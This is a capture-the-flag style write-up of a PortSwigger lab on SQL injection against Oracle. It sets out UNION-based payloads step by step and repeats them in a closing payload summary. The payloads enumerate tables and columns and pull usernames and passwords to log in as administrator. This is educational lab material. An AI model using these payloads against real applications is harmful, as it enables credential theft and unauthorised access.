# 🛡️ Lab: SQL Injection – Listing Database Contents (Oracle)

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Retrieve usernames and passwords from the database and log in as the administrator.

---

# 🔍 Step 1: Identify SQL Injection

Tested:

```sql
'
```

### 🔍 Observation:

* Page returned Internal Server Error

### 📌 Conclusion:

* SQL injection is possible

---

# 🧪 Step 2: Basic Behavior Testing

Tried:

```sql
' OR 1=1--+
' AND 1=2--+
```

### 🔍 Observation:

* Query behavior changes

### 📌 Conclusion:

* Input is affecting SQL logic → SQLi confirmed

---

# 🔐 Step 3: Fix Query Using Comments

Used:

```sql
'--+
```

### 📌 Important:

* Oracle requires proper query termination
* `--+` adds required space after comment

---

# 📊 Step 4: Find Number of Columns

### 🧪 Using ORDER BY

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

✔ Worked

```sql
' ORDER BY 3--+
```

❌ Error

### 📌 Conclusion:

* Query has **2 columns**

---

### 🧪 Using UNION

```sql
' UNION SELECT NULL,NULL FROM dual--+
```

✔ Worked

### 📌 Note:

* Oracle requires a table in SELECT
* `dual` is a dummy table used for this purpose

---

# 🧠 Step 5: Understand Oracle Difference

Unlike PostgreSQL:

| PostgreSQL                 | Oracle          |
| -------------------------- | --------------- |
| information_schema.tables  | all_tables      |
| information_schema.columns | all_tab_columns |

👉 Oracle does NOT use `information_schema`

---

# 🔍 Step 6: Extract Table Names

Initial understanding:

* `dual` does not contain metadata
* Metadata is stored in `all_tables`

---

### 🧪 Query

```sql
' UNION SELECT NULL, table_name FROM all_tables--+
```

### ✅ Result:

* Retrieved list of all tables

---

# 🧠 Step 7: Identify Target Table

From the list:

```text
USERS_CLRRKV
```

### 📌 Reason:

* Looks like user-related table
* Random suffix indicates real application table

---

# 🔍 Step 8: Extract Column Names

Used Oracle metadata table:

```sql
all_tab_columns
```

---

### 🧪 Query

```sql
' UNION SELECT NULL, column_name 
FROM all_tab_columns 
WHERE TABLE_NAME='USERS_CLRRKV'--+
```

### ⚠️ Important:

* Table name must be **UPPERCASE** in Oracle

---

### ✅ Result:

* Retrieved column names:

```text
USERNAME_YIOYZF
PASSWORD_CPAQPW
```

---

# 💥 Step 9: Extract User Data

### 🧪 Query

```sql
' UNION SELECT USERNAME_YIOYZF, PASSWORD_CPAQPW 
FROM USERS_CLRRKV--+
```

### ✅ Result:

* Retrieved usernames and passwords
* Included administrator credentials

---

# 🔓 Step 10: Login as Administrator

* Used extracted admin credentials
* Logged in successfully

---

# ⚠️ Final Observation

After login:

* Minor query manipulation (`'`) triggered lab completion

👉 This is not required for solution
👉 Actual solution is credential extraction

---

# 🧠 Key Learnings

* Oracle requires `FROM` clause → use `dual` when needed
* `dual` is not for metadata
* Metadata tables:

  * `all_tables` → table names
  * `all_tab_columns` → column names
* Table names in Oracle are case-sensitive (usually uppercase)
* UNION requires:

  * correct column count
  * correct data types
* Avoid guessing → always enumerate

---

# 🛠️ Payload Summary

### Injection Test

```sql
'
```

### Fix Query

```sql
'--+
```

### Find Columns

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

### UNION Test

```sql
' UNION SELECT NULL,NULL FROM dual--+
```

### Get Tables

```sql
' UNION SELECT NULL, table_name FROM all_tables--+
```

### Get Columns

```sql
' UNION SELECT NULL, column_name FROM all_tab_columns WHERE TABLE_NAME='USERS_CLRRKV'--+
```

### Extract Data

```sql
' UNION SELECT USERNAME_YIOYZF, PASSWORD_CPAQPW FROM USERS_CLRRKV--+
```

---

# 📌 Conclusion

This lab demonstrates how SQL injection differs across database systems and how to adapt techniques for Oracle:

1. Detect SQL injection
2. Fix query termination
3. Identify column count
4. Use Oracle metadata tables
5. Enumerate tables and columns
6. Extract sensitive data

---
